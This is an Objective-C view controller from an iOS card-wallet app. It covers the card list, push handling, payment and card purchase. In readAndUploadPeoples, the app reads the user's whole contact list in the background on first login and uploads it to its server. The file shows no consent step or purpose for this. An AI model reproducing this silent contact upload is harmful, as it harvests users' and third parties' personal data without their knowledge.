//
//  WJCardsViewController.m
//  WanJiCard
//
//  Created by Harry Hu on 15/8/28.
//  Copyright (c) 2015年 zOne. All rights reserved.

#import "WanJiCard-Swift.h"
//#import "WanJiCard_InHouse-Swift.h"
#import "WJCardsViewController.h"

#import "WJGeneratedPayCodeController.h"
#import "WJQRCodeViewController.h"
//#import "WJChangePayPsdController.h"
#import "WJPayCompleteController.h"
#import "WJLoginViewController.h"
#import "WJMaxCardViewController.h"
#import "WJRecommendStoreViewController.h"
#import "WJCardPackageDetailController.h"
#import "WJWebViewController.h"

#import "WJModelCard.h"
#import "WJDBCardManager.h"
#import "WJPayCompleteModel.h"

#import "APICardPackageManager.h"
#import "WJRefreshTableView.h"
#import "WJCardTableViewCell.h"
#import "WJCardReformer.h"
#import "WJModelCard.h"
#import "APISynProductManager.h"

#import "AppDelegate.h"
//wzj
#import "WJContactHelper.h"
#import "APIUserContactsManager.h"
#import "WJContactReformer.h"
#import <AVFoundation/AVFoundation.h>


#define kBlueViewHeight         ALD(194)


@interface WJCardsViewController ()<APIManagerCallBackDelegate, UITableViewDataSource, UITableViewDelegate>{
    
    BOOL isHeaderRefresh;
    BOOL isFooterRefresh;
    
    BOOL firstStart;
    
    UIView *_noteView;
}

@property (nonatomic, strong)APICardPackageManager      *cardPackageManager;
@property (nonatomic, strong)WJRefreshTableView         *tableView;
@property (nonatomic, strong)APISynProductManager       *synProductManager;

@property (nonatomic, strong)APIUserContactsManager     *userContacts;
@property (nonatomic, strong)NSMutableArray             *contactDataArray;

@end

@implementation WJCardsViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"卡包";
    self.eventID = @"iOS_act_cardbag";
    [self removeScreenEdgePanGesture];
    
    firstStart = YES;
    
    WJDBCardManager *cardM = [[WJDBCardManager alloc] initWithOwnedUserId:[WJGlobalVariable sharedInstance].defaultPerson.userID];
    self.dataArray = [NSMutableArray arrayWithArray:[cardM getCards]];
    
    [self UISetup];
    
    [kDefaultCenter addObserver:self selector:@selector(showLoginViewController) name:kNoLogin object:nil];
    [kDefaultCenter addObserver:self selector:@selector(quitAccount) name:@"kQuitAccountNotification" object:nil];
}


- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
    
    self.navigationController.navigationBarHidden = YES;
    
    [self checkView];
}

- (void)viewWillDisappear:(BOOL)animated
{
    [super viewWillDisappear:animated];
    
    self.navigationController.navigationBarHidden = NO;
}


- (void)dealloc
{
    [kDefaultCenter removeObserver:self];
}


- (void)checkView
{
    WJModelPerson * person = [WJGlobalVariable sharedInstance].defaultPerson;
    if (nil == person.token || 0 == person.token.length)
    {
        //未登录，是从退出登录过来的
        WJLoginViewController * rootVC = [[WJLoginViewController alloc] init];
        WJNavigationController *nvc = [[WJNavigationController alloc] initWithRootViewController:rootVC];
        [self.navigationController presentViewController:nvc animated:YES completion:nil];
        
    }else{

        [self.tableView startHeadRefresh];
        [self needReadPropleOrNot];
        //验证是否设置支付密码
        if (!person.hasVerifyPayPassword && person.token.length != 0) {
            
            if(person.isSetPayPassword){
                
                 [self goToVerifyWithIdenty:0];
                
            }else{

//                WJChangePayPsdController *changePayVC = [[WJChangePayPsdController alloc] initWithPsdType:ChangePayPsdTypeNew resetType:ResetPsyTypeInit];
//                changePayVC.from = ComeFromLogin;
//                [self.navigationController pushViewController:changePayVC animated:YES];
//                [[NSNotificationCenter defaultCenter]addObserver:self selector:@selector(dismiss) name:@"LoginProvingPass" object:nil];
            }
            
        }else{
            
            [self enterForeground];
        }
    }
}


- (void)enterForeground{
    
    NSDictionary *dic = [[NSUserDefaults standardUserDefaults] objectForKey:@"PushArguments"];
    NSString *forceTouchType = [[NSUserDefaults standardUserDefaults] objectForKey:KTap3DTouchIndex];
    
    if (dic) {
        [self dealPush:dic];
    }else if (forceTouchType){
        [self dealForceTouch:forceTouchType];
    }
    
}

- (void)dealPush:(NSDictionary *)dic{
    
    [[NSUserDefaults standardUserDefaults] setObject:nil forKey:@"PushArguments"];
    
    NSDictionary *pushUserInfo = dic[@"PushUserInfo"];
    NSInteger type = [dic[@"pushType"] integerValue];
    switch (type) {
            
        case PushTypeChargeComplete:
        {
            [WJGlobalVariable sharedInstance].payfromController = self;
            
            WJPayCompleteModel *model = [[WJPayCompleteModel alloc] initWithDic:pushUserInfo];
            model.paymentType = PaymentTypeConsume;
            WJPayCompleteController *vc = [[WJPayCompleteController alloc] initWithinfo:model];
            [self.navigationController pushViewController:vc animated:YES];
        }
            break;
            
        case PushTypeLogout:
        {
            WJModelPerson *person = [WJGlobalVariable sharedInstance].defaultPerson;
            [person logout];
            [self.navigationController popToRootViewControllerAnimated:YES];
        }
            break;
            
        case PushTypeActivity:
        {
            NSString *linkUrl = pushUserInfo[@"link"];
            NSString *title = pushUserInfo[@"title"];
            WJWebViewController *web = [WJWebViewController new];
            web.title = title;
            [web loadWeb:linkUrl];
            [self.navigationController pushViewController:web animated:YES];
        }
            break;
            
            
        case PushTypeSystom:
            
        default:
        {
            NSLog(@"No deal");
        }
            break;
    }
}

- (void)dealForceTouch:(NSString *)forceTouchType{
    
    //如果已经登录，如果从3D Touch进来
    [[NSUserDefaults standardUserDefaults] setObject:nil forKey:KTap3DTouchIndex];
     UIViewController *currentVC = [self.navigationController visibleViewController];
    
     //付款
    if ([forceTouchType intValue] == 1) {
       
        if (![currentVC isKindOfClass:[WJGeneratedPayCodeController class]]) {
           
            [self.navigationController popToRootViewControllerAnimated:NO];
            [self paymentAction];
        }
        
    } else if ([forceTouchType intValue] == 2) {
         //购卡
        if (![currentVC isKindOfClass:[WJRecommendStoreViewController class]]) {
          
            [self.navigationController popToRootViewControllerAnimated:NO];
            [self buyCardAction];
        }
       
    }
    
}


- (void)goToVerifyWithIdenty:(int)identy
{
   
//    WJChangePayPsdController *changePayVC = [[WJChangePayPsdController alloc] initWithPsdType:ChangePayPsdTypeVerify resetType:ResetPsyTypeVerify];
//    [WJGlobalVariable sharedInstance].fromController = self;
//    if (identy == 0) {
//         changePayVC.from = ComeFromLogin;
//         [[NSNotificationCenter defaultCenter]addObserver:self selector:@selector(dismiss) name:@"LoginProvingPass" object:nil];
//    }
//    if (identy == 1) {
//        changePayVC.from = ComeFromPayCode;
//    }
//   
//    [self.navigationController pushViewController:changePayVC animated:YES];
    
}

- (void)dismiss
{
    [self.navigationController popViewControllerAnimated:YES];
    WJModelPerson * person = [WJGlobalVariable sharedInstance].defaultPerson;
    person.hasVerifyPayPassword = YES;
    //跟新数据库
    [[WJDBPersonManager new] updatePerson:person];
    
}


- (void)quitAccount{
    [self.dataArray removeAllObjects];
    [self.tableView reloadData];
}


#pragma mark- wzj-method
- (void)needReadPropleOrNot
{
    if(![[NSUserDefaults standardUserDefaults] boolForKey:@"firstReadAllPeople"] ){
        //上传通讯录
        [self readAndUploadPeoples];
    }
}


- (void)readAndUploadPeoples
{
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        
        // 读取通讯录
        NSString * allPeoples = [[WJContactHelper new] readAllPeoples];

        [self uploadAllProles:allPeoples];

    });
   
}

- (void)uploadAllProles:(NSString *) allPeopleString{
    self.userContacts.content = allPeopleString;
    [self.userContacts loadData];
}


#pragma mark - WJRefreshTableView Delegate
- (void)startHeadRefreshToDo:(WJRefreshTableView *)tableView
{
    if (!isHeaderRefresh) {
        isHeaderRefresh = YES;
        self.cardPackageManager.shouldCleanData = YES;
        [self cardPackageBagRequest];
    }
}

- (void)startFootRefreshToDo:(UITableView *)tableView
{
    if (!isFooterRefresh) {
        isFooterRefresh = YES;
        self.cardPackageManager.shouldCleanData = NO;
        [self cardPackageBagRequest];
    }
}

- (void)endGetData:(BOOL)needReloadData{
    
    if (isHeaderRefresh) {
        isHeaderRefresh = NO;
        [self.tableView endHeadRefresh];
    }
    
    if (isFooterRefresh){
        isFooterRefresh = NO;
        [self.tableView endFootFefresh];
    }
    
    if (needReloadData) {
        [self.tableView reloadData];
    }
}


- (void)refreshFooterStatus:(BOOL)status{
    
    if (status) {
        [self.tableView hiddenFooter];
    }else {
        [self.tableView showFooter];
    }
    
    if (self.dataArray.count > 0) {
        
        self.tableView.tableFooterView = [UIView new];
        
    }else{
       
        self.tableView.tableFooterView = _noteView;
    }
    
}


#pragma mark - UIStatusBarDelegate

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}


#pragma mark - APIManagerCallBackDelegate
- (void)managerCallAPIDidSuccess:(APIBaseManager *)manager
{
    if ([manager isKindOfClass:[self.cardPackageManager class]]) {
        [self.tableView endHeadRefresh];
        [self.tableView endFootFefresh];
        self.dataArray = [manager fetchDataWithReformer:[[WJCardReformer alloc] init]];

        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            WJDBCardManager *cardM = [[WJDBCardManager alloc] initWithOwnedUserId:[WJGlobalVariable sharedInstance].defaultPerson.userID];
            
            [cardM removeCards];
            
            if (self.dataArray.count > 0) {
                [cardM insertCards:self.dataArray];
            }

        });
        
        [self refreshFooterStatus:self.cardPackageManager.hadGotAllData];
        [self endGetData:YES];
        
    }
    else if([manager isKindOfClass:[APIUserContactsManager class]]){
        self.contactDataArray = [manager fetchDataWithReformer:[[WJContactReformer alloc] init]];
        [[NSUserDefaults standardUserDefaults] setBool:YES forKey:@"firstReadAllPeople"];
        [[NSUserDefaults standardUserDefaults] synchronize];
        NSLog(@"--->>>通讯录；dataArray = %@",self.contactDataArray);
    }
}


- (void)managerCallAPIDidFailed:(APIBaseManager *)manager
{

    if ([manager isKindOfClass:[APICardPackageManager class]] ){
        if (manager.errorType == APIManagerErrorTypeNoData) {
            if (self.cardPackageManager.shouldCleanData) {
                [self.dataArray removeAllObjects];
            }
            [self refreshFooterStatus:YES];
            if (isHeaderRefresh) {
                [self endGetData:YES];
                return;
            }
            [self endGetData:NO];
            
        }else{
            
            [self refreshFooterStatus:self.cardPackageManager.hadGotAllData];
            [self endGetData:NO];
        }
    }
}

#pragma mark - UITableViewDelegate&DataSource
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    return 1;
}


- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    return [self.dataArray count];
}


- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    return ALD(105);
}


- (WJCardTableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    WJCardTableViewCell* cell = [tableView dequeueReusableCellWithIdentifier:@"cellID"];
    if (nil == cell) {
        cell = [[WJCardTableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:@"cellID"];
        cell.selectionStyle = UITableViewCellSelectionStyleNone;

    }
    
    [cell configData:[self.dataArray objectAtIndex:indexPath.row]];
    
    return cell;
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSLog(@"%@",indexPath);
    NSLog(@"%s",__func__);
    
    WJModelCard * cardModel = (WJModelCard *)[self.dataArray objectAtIndex:indexPath.row];
    WJCardPackageDetailController *dvc = [[WJCardPackageDetailController alloc] init];
    dvc.card = cardModel;
    [tableView deselectRowAtIndexPath:indexPath animated:YES];

    [self.navigationController pushViewController:dvc animated:YES];
}



#pragma mark- Event Response
// TODO:所有 button、gestureRecognizer、notification 的事件相应方法，与跳转到其他 controller 的出口方法都写在这里。
- (void)cardPackageBagRequest
{
    [self.cardPackageManager loadData];
    
}


- (void)leftButtonAction{
    
    WJIndividualCenterController * center=[[WJIndividualCenterController alloc]init];
    [self.navigationController pushViewController:center animated:YES];
}

- (void)rightButtonAction{
    WJMaxCardViewController * center = [[WJMaxCardViewController alloc] init];
    [self.navigationController pushViewController:center animated:YES];
}

- (void)paymentAction
{
    NSString *key = [[WJGlobalVariable sharedInstance].defaultPerson.userID stringByAppendingString:@"PasswordSwitch"];
    BOOL openNoPsdPay = NO;
    if (key.length > 0) {
        openNoPsdPay = [[NSUserDefaults standardUserDefaults] boolForKey:key];
    }
    
    WJModelPerson *person = [WJGlobalVariable sharedInstance].defaultPerson;
    if (person.isSetPayPassword && openNoPsdPay) {
        WJGeneratedPayCodeController *gvc = [[WJGeneratedPayCodeController alloc] init];
        [self.navigationController pushViewController:gvc animated:YES];
    }else{
        
        if (!openNoPsdPay) {
            
            [self goToVerifyWithIdenty:1];

        }else{
//            WJChangePayPsdController *vc = [[WJChangePayPsdController alloc] initWithPsdType:ChangePayPsdTypeNew resetType:ResetPsyTypeInit];
//            [self.navigationController pushViewController:vc animated:YES];
        }
    }
}

- (void)buyCardAction
{
    NSLog(@"%s",__func__);
    WJRecommendStoreViewController * recommendVC = [[WJRecommendStoreViewController alloc] init];
    [self.navigationController pushViewController:recommendVC animated:YES];
}


- (void)showLoginViewController
{
    WJModelPerson * person = [WJGlobalVariable sharedInstance].defaultPerson;
    if (person.isActively) {
        [person logout];
    }

//    ********************
    [self.navigationController popToRootViewControllerAnimated:NO];
    [[TKAlertCenter defaultCenter] postAlertWithMessage:@"您的账号在其他设备登录，请重新登录"];

    WJLoginViewController * rootVC = [[WJLoginViewController alloc] init];
    WJNavigationController *nvc = [[WJNavigationController alloc] initWithRootViewController:rootVC];
    
    [self.navigationController presentViewController:nvc
                                            animated:YES
                                          completion:^{

    }];
}

#pragma mark - privateMethod
- (void)navigationSetup
{
    [self hiddenBackBarButtonItem];
    
    UIButton *leftButton = [UIButton buttonWithType:UIButtonTypeCustom];
    leftButton.frame = CGRectMake(0, 0, 30, 30);
    [leftButton setImage:[UIImage imageNamed:@"cardbag_ren_icon"] forState:UIControlStateNormal];

    
    [leftButton addTarget:self action:@selector(leftButtonAction) forControlEvents:UIControlEventTouchUpInside];
    self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithCustomView:leftButton];
    
    UIButton *rightButton = [UIButton buttonWithType:UIButtonTypeCustom];
    rightButton.frame = CGRectMake(0, 0, 30, 30);
    [rightButton setImage:[UIImage imageNamed:@"cardbag_scan_icon"] forState:UIControlStateNormal];
    //    [centerBtn setTitle:@"个人中" forState:UIControlStateNormal];
    
    [rightButton addTarget:self action:@selector(rightButtonAction) forControlEvents:UIControlEventTouchUpInside];
    self.navigationItem.rightBarButtonItem = [[UIBarButtonItem alloc] initWithCustomView:rightButton];
}



- (void)UISetup
{
    [self navigationSetup];
    
    UIView * blueView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, kScreenWidth, kBlueViewHeight)];
    blueView.backgroundColor = [WJUtilityMethod colorWithHexColorString:@"028be6"];
    
    UIButton *leftButton = [UIButton buttonWithType:UIButtonTypeCustom];
    leftButton.frame = CGRectMake(ALD(13),20, ALD(44), ALD(44));
    [leftButton setImage:[UIImage imageNamed:@"cardbag_ren_icon"] forState:UIControlStateNormal];
    [leftButton addTarget:self action:@selector(leftButtonAction) forControlEvents:UIControlEventTouchUpInside];
    [blueView addSubview:leftButton];
    
    UIButton *rightButton = [UIButton buttonWithType:UIButtonTypeCustom];
    rightButton.frame = CGRectMake(kScreenWidth - ALD(55) , CGRectGetMinY(leftButton.frame), ALD(44), ALD(44));
    [rightButton setImage:[UIImage imageNamed:@"cardbag_scan_icon"] forState:UIControlStateNormal];
    [rightButton addTarget:self action:@selector(rightButtonAction) forControlEvents:UIControlEventTouchUpInside];
    [blueView addSubview:rightButton];
    
//    leftButton.backgroundColor = [WJUtilityMethod randomColor];
//    rightButton.backgroundColor = [WJUtilityMethod randomColor];
    
    UILabel * titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(CGRectGetMaxX(leftButton.frame), CGRectGetMinY(leftButton.frame), kScreenWidth - ALD(100), CGRectGetHeight(leftButton.frame))];
    titleLabel.text = @"卡包";
    titleLabel.font = WJFont18;
    titleLabel.textAlignment = NSTextAlignmentCenter;
    titleLabel.textColor = [UIColor whiteColor];
    [blueView addSubview:titleLabel];
    
    UIButton * payButton = [UIButton buttonWithType:UIButtonTypeCustom];
    [payButton setFrame:CGRectMake(ALD(95), ALD(94), ALD(45), ALD(45))];
    [payButton setImage:[UIImage imageNamed:@"cardbag_payment"] forState:UIControlStateNormal];
    [payButton addTarget:self action:@selector(paymentAction) forControlEvents:UIControlEventTouchUpInside];
    
    UILabel * payLabel =  [[UILabel alloc] initWithFrame:CGRectMake(CGRectGetMinX(payButton.frame),
                                                                   CGRectGetMaxY(payButton.frame) + ALD(10),
                                                                   CGRectGetWidth(payButton.frame),
                                                                    ALD(20))];
    payLabel.text = @"付款";
    payLabel.textAlignment = NSTextAlignmentCenter;
    payLabel.textColor = [UIColor whiteColor];
    
    UIButton * buyButton = [UIButton buttonWithType:UIButtonTypeCustom];
    [buyButton setFrame:CGRectMake(ALD(95) + CGRectGetMaxX(payButton.frame), ALD(94), ALD(45), ALD(45))];
    [buyButton setImage:[UIImage imageNamed:@"cardbag_buy"] forState:UIControlStateNormal];
    [buyButton addTarget:self action:@selector(buyCardAction) forControlEvents:UIControlEventTouchUpInside];
    
    UILabel * buyLabel =  [[UILabel alloc] initWithFrame:CGRectMake(CGRectGetMinX(buyButton.frame),
                                                                    CGRectGetMaxY(buyButton.frame) + ALD(10),
                                                                    CGRectGetWidth(buyButton.frame),
                                                                    ALD(20))];
    buyLabel.text = @"购卡";
    buyLabel.textAlignment = NSTextAlignmentCenter;
    buyLabel.textColor = [UIColor whiteColor];
    
    [blueView addSubview:payLabel];
    [blueView addSubview:payButton];
    [blueView addSubview:buyButton];
    [blueView addSubview:buyLabel];
    
    //无卡时提醒免费领卡
    _noteView = [[UIView alloc] initWithFrame:CGRectMake(0, kBlueViewHeight, kScreenWidth, kScreenHeight - kBlueViewHeight)];
    _noteView.backgroundColor = [UIColor clearColor];
    
   
    UIImageView *cardImage = [[UIImageView alloc]initWithFrame:CGRectMake((kScreenWidth - ALD(90))/2, ALD(80), ALD(90), ALD(90))];
    cardImage.image = [UIImage imageNamed:@"notice_card_icon"];
    [_noteView addSubview:cardImage];
    
    
    UILabel *noticeLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, cardImage.frame.origin.y + cardImage.frame.size.height + 20, kScreenWidth, 20)];
    noticeLabel.text = @"您的卡包空空的";
    noticeLabel.textAlignment = NSTextAlignmentCenter;
    noticeLabel.textColor = WJColorDardGray9;
    noticeLabel.font = WJFont13;
    [_noteView addSubview:noticeLabel];
    
    
    UIButton *getBtn = [UIButton buttonWithType:UIButtonTypeCustom];
    getBtn.frame = CGRectMake(kScreenWidth/2-60, noticeLabel.frame.origin.y + noticeLabel.frame.size.height + 20, 120, 30);
    [getBtn setTitle:@"去购买" forState:UIControlStateNormal];
    getBtn.layer.cornerRadius = 4;
    getBtn.layer.borderWidth = 1;
    getBtn.layer.borderColor = [WJColorNavigationBar CGColor];
    [getBtn.titleLabel setFont:WJFont13];
    [getBtn setTitleColor:WJColorNavigationBar forState:UIControlStateNormal];
    [getBtn addTarget:self action:@selector(buyCardAction) forControlEvents:UIControlEventTouchUpInside];
    [_noteView addSubview:getBtn];
    
    [self.view addSubview:blueView];
    [self.view addSubview:self.tableView];

}


#pragma mark- Getter and Setter
// TODO:所有属性的初始化，都写在这
- (APICardPackageManager *)cardPackageManager
{
    if (nil == _cardPackageManager) {
        _cardPackageManager = [[APICardPackageManager alloc] init];
        _cardPackageManager.shouldParse = YES;
        _cardPackageManager.delegate = self;
        
    }
    return _cardPackageManager;
}

- (WJRefreshTableView *)tableView
{
    if (nil == _tableView) {
        _tableView = [[WJRefreshTableView alloc] initWithFrame:CGRectMake(0,kBlueViewHeight , kScreenWidth, kScreenHeight - kBlueViewHeight)
                                                         style:UITableViewStylePlain
                                                    refreshNow:NO
                                               refreshViewType:WJRefreshViewTypeBoth];
        _tableView.delegate = self;
        _tableView.dataSource = self;
        _tableView.separatorStyle = UITableViewCellSeparatorStyleNone;
    }
    return _tableView;
}


- (NSMutableArray *)dataArray
{
    if (nil == _dataArray) {
        _dataArray = [NSMutableArray array];
    }
    return _dataArray;
}

- (APISynProductManager *)synProductManager
{
    if (nil == _synProductManager)
    {
        _synProductManager = [[APISynProductManager alloc] init];
        _synProductManager.delegate = self;
    }
    return _synProductManager;
}

// wzj
-(APIUserContactsManager *)userContacts
{
    if (nil==_userContacts) {
        _userContacts = [[APIUserContactsManager alloc]init];
        _userContacts.shouldCleanData = YES;
        _userContacts.delegate = self;
    }
    return  _userContacts;
}
-(NSMutableArray *)contactDataArray
{
    if (nil==_contactDataArray) {
        _contactDataArray = [[NSMutableArray alloc]init];
    }
    return _contactDataArray;
}
@end
